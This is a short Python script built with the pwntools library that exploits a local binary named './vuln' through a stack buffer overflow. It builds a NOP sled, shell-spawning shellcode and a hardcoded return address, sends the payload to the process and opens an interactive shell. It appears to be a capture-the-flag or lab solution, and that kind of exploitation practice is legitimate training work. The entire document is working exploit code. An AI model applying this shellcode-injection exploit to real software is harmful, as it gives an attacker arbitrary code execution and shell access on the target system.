from pwn import *
exe = './vuln'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = process()

padding = 312
shell = asm(shellcraft.sh())
retAddr = p32(0xffffca24)

padding = padding - len(shell) - len(retAddr)
print(padding)
print(shell)
print(retAddr)

payload = flat(
    asm('nop') * padding,
    shell,
    retAddr
)
io.sendline(payload)
write("payload", payload)
io.interactive()